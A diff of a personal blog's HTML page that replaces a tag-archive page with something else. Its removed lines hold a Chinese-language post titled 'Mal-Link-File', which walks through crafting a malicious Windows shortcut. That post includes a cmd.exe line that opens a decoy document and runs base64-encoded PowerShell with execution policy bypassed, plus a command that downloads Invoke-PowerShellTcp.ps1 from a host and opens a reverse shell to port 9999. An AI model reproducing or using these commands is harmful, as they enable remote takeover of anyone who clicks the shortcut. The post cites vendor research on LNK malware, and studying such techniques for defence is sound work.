@@ -3,7 +3,7 @@
 <html lang="zh-TW">
 <head>
     <meta charset="utf-8" />
-    <title>Mal-Link-File | t2o0n321.blog</title>
+    <title>Tags: copypaste | t2o0n321.blog</title>
     <meta name="author" content="t2o0n321" />
     <meta name="description" content="t2o0n321 的部落格，記錄生活點滴、學習筆記、程式開發等。" />
     <meta name="keywords" content="" />
@@ -44,10 +44,6 @@
 
 
 <script src="/js/lib/preview.js"></script>
-
-
-
-
 
 
 
@@ -161,82 +157,116 @@
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <div class="article">
-    <div>
-        <h1>Mal-Link-File</h1>
-    </div>
-    <div class="info">
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2025/6/10
-        </span>
+            <div id="archives">
+    
+    <div class="categories-tags">
         
         
-            <span class="tags">
+        
+        <span>
+            <a href="/tags/crypto-currencies/" style="background: #00a596">
                 <span class="icon">
                     <i class="fa-solid fa-tags fa-fw"></i>
                 </span>
-                
-                
-                <span class="tag">
-                    
-                    <a href="/tags/exploit/" style="color: #03a9f4">
-                        exploit
-                    </a>
+                crypto-currencies
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/tags/hexo/" style="background: #03a9f4">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
                 </span>
-                
-            </span>
+                hexo
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/tags/setup/" style="background: #ffa2c4">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                setup
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/tags/exploit/" style="background: #03a9f4">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                exploit
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/tags/where-to-start/" style="background: #00bcd4">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                where-to-start
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/tags/copypaste/" style="background: linear-gradient(120deg, #9abbf7 0%, #ffbbf4 100%)">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                copypaste
+            </a>
+        </span>
+        
+        
+        
         
     </div>
     
-    <div class="content" v-pre>
-        <h1 id="table-of-contents">Table of Contents</h1>
-<ul>
-<li><a href="#basic">Basic</a></li>
-<li><a href="#exploit">Exploit</a></li>
-<li><a href="#reference">Reference</a></li>
-</ul>
-<h1 id="basic">Basic</h1>
-<ul>
-<li>捷徑的<a
-target="_blank" rel="noopener" href="https://stackoverflow.com/questions/1880321/why-does-the-260-character-path-length-limit-exist-in-windows">最高可以輸入260個字元</a></li>
-<li>PowerShell -ec 可以使用 Base64 編碼，但是必須是 UTF-16LE 編碼的字串
-<img src="/2025/06/10/mal-link-file/pwsh-base64.png" class="" title="PowerShell Base64 Encode"></li>
-<li>測試用指令編碼 👉 <a
-target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=Encode_text(&#39;UTF-16LE%20(1200)&#39;)To_Base64(&#39;A-Za-z0-9%2B/%3D&#39;)&amp;input=d2hvYW1pIC9wcml2">CyberChef</a></li>
-<li>製作cmd.exe的捷徑，並將指令塞入</li>
-</ul>
-<div class="sourceCode" id="cb1"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>C<span class="op">:</span>\Windows\System32\cmd<span class="op">.</span><span class="fu">exe</span> <span class="op">/</span>k <span class="st">&quot;start winword %cd%/test.docx &amp;&amp; set z=ec &amp;&amp; call powershell -exec bypass -nop -%z%dwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYA&quot;</span></span></code></pre></div>
-<img src="/2025/06/10/mal-link-file/pwsh-test.png" class="">
-<h1 id="exploit">Exploit</h1>
-<ul>
-<li>建立 http server <img src="/2025/06/10/mal-link-file/http-server.png" class=""></li>
-<li>設立 nc 接收回彈的 shell <img src="/2025/06/10/mal-link-file/nc-shell.png" class=""></li>
-<li>捷徑內指令</li>
-</ul>
-<div class="sourceCode" id="cb2"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="op">%</span>systemroot<span class="op">%</span>\System32\cmd<span class="op">.</span><span class="fu">exe</span> <span class="op">/</span>c <span class="st">&quot;call powershell -exec bypass -nop iex(New-Object Net.WebClient).DownloadString(&#39;http://172.28.166.2:8000/Invoke%2DPowerShellTcp%2Eps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 172.28.166.2 -Port 9999&quot;</span></span></code></pre></div>
-<ul>
-<li>待使用者點擊捷徑後，便可接收到 shell <img src="/2025/06/10/mal-link-file/get-shell.png" class=""></li>
-</ul>
-<h1 id="reference">Reference</h1>
-<ul>
-<li><a
-target="_blank" rel="noopener" href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rise-of-lnk-shortcut-files-malware/">https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rise-of-lnk-shortcut-files-malware/</a></li>
-<li><a
-target="_blank" rel="noopener" href="https://www.trendmicro.com/en_vn/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html">https://www.trendmicro.com/en_vn/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html</a></li>
-</ul>
-
+    <div class="timeline">
+        <div class="timeline-tail"></div>
+        <div class="timeline-content">
+            <div class="item-time">2025/6/25</div>
+            <a href="/2025/06/25/setup-copypasteme-guide/">
+                <h3>CopyPaste.me Full Setup Guide</h3>
+            </a>
+            <div class="info">
+                
+                
+                <span class="tags">
+                    <span class="icon">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </span>
+                    
+                    
+                    <span class="tag">
+                        
+                        <a href="/tags/setup/" style="color: #00bcd4">
+                            setup
+                        </a>
+                    </span>
+                    
+                    <span class="tag">
+                        
+                        <a href="/tags/copypaste/" style="color: #ffa2c4">
+                            copypaste
+                        </a>
+                    </span>
+                    
+                </span>
+                
+            </div>
+        </div>
     </div>
-    
-    
-    
-    
-    
-    
     
 </div>
 
@@ -268,12 +298,6 @@ target="_blank" rel="noopener" href="https://www.trendmicro.com/en_vn/research/1
         
     </div>
     <script src="/js/main.js"></script>
-    
-    
-
-
-
-
     
 </body>
 </html>
